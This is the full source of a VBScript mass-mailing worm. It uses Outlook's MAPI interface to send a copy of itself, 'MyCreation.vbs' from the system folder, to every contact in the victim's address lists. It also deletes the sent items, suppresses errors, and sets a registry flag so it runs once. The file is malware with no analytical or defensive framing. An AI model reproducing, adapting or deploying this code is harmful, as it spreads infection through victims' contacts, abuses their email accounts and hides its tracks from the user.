On Error Resume Next
Dim FSO, oWSH
Set FSO = CreateObject("Scripting.filesystemobject")
Set oWSH = CreateObject("WScript.Shell")
If oWSH.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\vbsmail") <> "Done" Then
	Set oMSO = CreateObject("Outlook.Application")
		If oMSO = "Outlook" Then
			Set oMAPI = oMSO.GetNameSpace("MAPI")
				For Each oADDRESS In oMAPI.AddressLists
					If oADDRESS.AddressEntries.Count <> 0 Then
						For oEML = 1 To oADDRESS.AddressEntries.Count
							Set oEML2 = oADDRESS.AddressEntries(oEML)
								
								If oEML2.address<> "" Then
									Set oMSG = oMSO.CreateItem(0)
									oMSG.to = oEML2.address
									oMSG.Subject = "Hey let's cut the bullshit!"
									oMSG.Body = "You and I both know the attached file is"&_
            									" something evil that I created hoping th"&_
            									"at you help me promote it by sending all"&_
           									    " your contacts a free copy of my latest creation!"
									oMSG.Attachments.Add FSO.GetSpecialFolder(1) & "\MyCreation.vbs"
									oMSG.DeleteAfterSubmit = True
									oMSG.Send
								End If
						Next
					End If
				Next
			oWSH.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\vbsmail", "Done"
		oMSO.Quit
End If